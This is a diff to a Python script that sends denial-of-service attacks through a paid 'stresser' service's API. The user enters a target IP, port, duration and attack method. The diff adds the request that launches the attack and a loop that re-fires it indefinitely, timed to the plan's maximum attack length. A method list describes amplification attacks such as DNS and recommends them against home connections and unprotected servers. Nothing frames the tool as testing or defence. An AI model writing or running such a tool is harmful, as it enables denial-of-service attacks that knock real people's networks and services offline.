@@ -1,7 +1,6 @@
-import json
 import requests
 import time
-
+import json
 
 def ddos():
     methodlist = """1	DNS	IPv4 (L3 ,L4)	Method based on Domain Name System, have bigest amplification power. Recomended for home connection, unprotected servers.
@@ -117,15 +116,20 @@ ID	Name	Type	Description
     port = input("port:")
     timer = input("Time (max 3600):")
     print("Here are some methods:\n")
-    time.sleep(5)
+    time.sleep(3)
     print(methodlist)
-    methods = input("method:")
+    methods = input("method (name):") #cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
     concurrents = input("Concurrents (max 5):")
     hub = "basic"
     payload = {"target": ip, "port": port, "time": timer, "method": methods, "hub": hub}
-    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4"
+    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
     print("Executing...\n")
+    response = requests.get(baseurl, params=payload)
+    responsejson = response.json()
     print("Checking response...")
+    for key, value in responsejson.items():
+        print(key, ":", value)
+    print(str("\nSuccess! Executed: ") + response.url)
     print("\nSuccess! Executed on target!")
     time.sleep(5)
     if int(concurrents) == 1:
@@ -251,28 +255,27 @@ ID	Name	Type	Description
     print("Here are some methods:\n")
     time.sleep(3)
     print(methodlist)
-    methods = input("method:")
-    concurrents = "1"
+    methods = input("method (name):") #cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
     hub = "basic"
     payload = {"target": ip, "port": port, "time": timer, "method": methods, "hub": hub}
-    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4"
+    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
     print("Executing...\n")
 
     def ddosloop():
         count = 0
-        while (count < 5):
+        while count < 5:  # set count to maximum concurrents your plan allows
             response = requests.get(baseurl, params=payload)
             responsejson = response.json()
             print("Checking response...")
             for key, value in responsejson.items():
                 print(key, ":", value)
-            print(str("\nSuccess! Executed: ") + (response.url))
+            print(str("\nSuccess! Executed: ") + response.url)
             count += 1
 
     looper = 0
     while looper != 1:
         ddosloop()
-        time.sleep(3750)
+        time.sleep(3620)  # Set this to whatever your maximum boot time on zdstresser.net is + 20 seconds for latency
 
 
 def queryofloop():
